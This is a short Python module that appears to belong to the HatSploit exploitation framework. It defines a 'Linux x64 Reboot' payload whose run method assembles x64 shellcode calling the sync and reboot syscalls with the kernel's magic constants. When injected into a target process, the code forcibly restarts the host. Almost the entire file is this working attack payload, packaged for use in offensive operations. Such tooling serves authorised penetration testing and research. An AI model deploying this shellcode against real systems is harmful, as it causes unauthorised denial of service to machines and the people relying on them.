#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from pex.assembler import AssemblerTools


class HatSploitPayload(Payload, AssemblerTools):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Reboot",
        'Payload': "linux/x64/reboot",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Reboot payload for Linux x64.",
        'Architecture': "x64",
        'Platform': "linux",
        'Rank': "low",
        'Type': "one_side"
    }

    def run(self):
        return self.assemble(
            self.details['Architecture'],
            """
            start:
                mov al, 0xa2
                syscall

                mov al, 0xa9
                mov edx, 0x1234567
                mov esi, 0x28121969
                mov edi, 0xfee1dead
                syscall
            """
        )
